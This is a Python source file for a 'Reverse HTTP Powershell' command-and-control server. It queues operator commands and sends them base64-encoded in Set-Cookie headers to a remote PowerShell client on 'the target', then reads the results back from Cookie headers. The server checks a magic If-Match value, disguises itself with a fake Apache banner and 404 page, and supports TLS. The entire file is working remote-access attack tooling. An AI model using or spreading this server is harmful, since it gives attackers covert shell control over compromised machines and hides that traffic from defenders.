#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys   
if sys.version_info.major < 3: print("[-] You need Python 3."); sys.exit(255)
# EDIT magic_value to here and on client
magic_value = "737060cd8c284d8af7ad3082f209582d"
APP_NAME = "Reverse HTTP Powershell"
APP_VERSION = "0.1"

from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
from queue import Queue
import getopt
import cmd
import sys
import base64

DEFAULT_HTTP_PORT = 8080
DEFAULT_HTTPS_PORT = 8081

PROMPT = "> "

magic_header = "If-Match"
command_cookie = "Set-Cookie"
response_cookie = "Cookie"

page_404 = """<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {} was not found on this server.</p>
</body></html>"""

global_headers = {
    'Server': 'Apache/2.4.7 (Ubuntu)',
    'Content-type': 'text/html; charset=iso-8859-1',
}


#############################################################################
# Commands.                                                                 #
#############################################################################

def Red(output):
    return Color(31, output)


def Color(color, output):
    return("\033[{0}m{1}\033[0m".format(color, output))


def log(msg):
    sys.stdout.write("\n{0}\n{1}".format(msg, PROMPT))


def log_error(msg):
    sys.stdout.write("\n{0}\n{1}".format(Red(msg), PROMPT))


class CommandShell(cmd.Cmd):
    def __init__(self, queue):
        super(CommandShell, self).__init__()
        self.queue = queue
        self.prompt = PROMPT

    def do_EOF(self, line):
        print("")
        return True

    def do_help(self, line):
        return self.default("help " + line)

    def default(self, line):
        self.queue.put(line, block=True)
        self.queue.task_done()
        return

    # Do not repeat last command when line is empty.
    def emptyline(self):
        pass


#############################################################################
# HTTP.                                                                     #
#############################################################################

class MyHttpServer(HTTPServer):
    def __init__(self, server_address, RequestHandlerClass, queue):
        HTTPServer.__init__(self, server_address, RequestHandlerClass)
        self.RequestHandlerClass.queue = queue


class MyHTTPRequestHandler(BaseHTTPRequestHandler):

    def __init__(self,  request, client_address, server):
        BaseHTTPRequestHandler.__init__(self, request, client_address, server)
        self.queue = None

    def log_message(self, format, *args):
        return

    def do_GET(self):
        # This is not a legit request.
        if magic_header not in self.headers or self.headers[magic_header] != magic_value:

            log_error("!!! {0}:{1} is trying to connect without magic value !!!".format(self.client_address[0], self.client_address[1]))

            self.send_response(404)
            for k in global_headers.keys():
                self.send_header(k, global_headers[k])
            self.end_headers()
            self.wfile.write(page_404.format(self.path).encode())  # With a nice reflective XSS ;-)
            return

        self.send_response(200)

        # Printing the response.
        if response_cookie in self.headers:
            o = self.headers[response_cookie]
            o = base64.b64decode(o)
            log(o.decode())

        # Sending the command to execute.
        else:
            cmd = self.queue.get(block=True)
            if cmd:
                self.send_header(command_cookie, base64.b64encode(cmd.encode()).decode())

        try:
            self.end_headers()
            self.wfile.write(b"")
        except BrokenPipeError: 
            log("[-] Client timeout. Requeuing command.")
            if response_cookie not in self.headers:
                self.queue.put(cmd)  # We need to put back the command because powershell has time outed.
        except:
            pass
        return


#############################################################################
# Threads.                                                                  #
#############################################################################

class HttpdThread(threading.Thread):
    def __init__(self, queue, port, ssl_cert=None):
        super(HttpdThread, self).__init__()
        self.queue = queue
        self.port = port
        self.ssl_cert = ssl_cert

    def run(self):
        try:
            httpd = MyHttpServer(("", self.port), MyHTTPRequestHandler, self.queue)
        except OSError:
            print("[-] Can't start HTTP(s) server. Already listening?")
            return

        if self.ssl_cert is not None:
            import ssl
            try:
                httpd.socket = ssl.wrap_socket(httpd.socket, certfile=self.ssl_cert, server_side=True)
            except (FileNotFoundError, ssl.SSLError):
                print()
                print("[-] You need to generate your own certificate.")
                sys.exit(255)

        httpd.serve_forever()


class CommandThread(threading.Thread):
    def __init__(self, queue):
        super(CommandThread, self).__init__()
        self.queue = queue

    def run(self):
        c = CommandShell(self.queue)
        c.cmdloop()

#############################################################################
# Main.                                                                     #
#############################################################################


def Usage(argv):
    print("Usage: {0} [options]".format(argv[0]))
    print("  -p port       HTTP server port ({0} default port).".format(DEFAULT_HTTP_PORT))
    print("  -s cert       Use SSL ({0} default port).".format(DEFAULT_HTTPS_PORT))
    print("  -h            This help.")
    print("")
    print("To generate a certificate:")
    print("openssl req -x509  -nodes -newkey rsa:2048 -days 365 \\")
    print("    -subj '/C=CA/ST=QC/L=Montreal/O=Company Name/CN=server.name.com' \\")
    print("    -keyout server.pem -out server.pem")
    sys.exit(255)

if __name__ == "__main__":
    print("-=[ {0} v{1} ]=-\n".format(APP_NAME, APP_VERSION))

    port = 0
    ssl = None

    try:
        opts, args = getopt.getopt(sys.argv[1:], "p:s:h")
    except getopt.GetoptError as err:
        Usage(sys.argv)

    for o, a in opts:
        if o == "-p":
            try:
                port = int(a)
            except ValueError:
                Usage(sys.argv)
        elif o == "-s":
            ssl = a
        elif o == "-h":
            Usage(sys.argv)
        else:
            Usage(sys.argv)

    if ssl is not None and port == 0:
        port = DEFAULT_HTTPS_PORT

    if port == 0:
        port = DEFAULT_HTTP_PORT

    # The queue is used to pass information between the different threads.
    q = Queue()
    q.put([])

    if ssl is not None:
        print("[+] HTTPS server listening on {0}/TCP.\n".format(port))
    else:
        print("[+] HTTP server listening on {0}/TCP.\n".format(port))

    print("[*] Don't forget to terminate the session sending `Exit` to the target when done.")
    print("[*] Otherwise the script is still running")
    print("")

    try:
        thread1 = HttpdThread(q, port, ssl)
        thread1.daemon = True
        thread1.start()

        thread2 = CommandThread(q)
        thread2.daemon = True
        thread2.start()

        while thread2.isAlive() is True and thread1.isAlive() is True:
            thread2.join(1)

    except (KeyboardInterrupt, SystemExit):
        print()
        print("[*] Did you `Exit` on the target? Otherwise you can always reconnect as the client is probing")
        print()
        sys.exit(0)

    sys.exit(0)
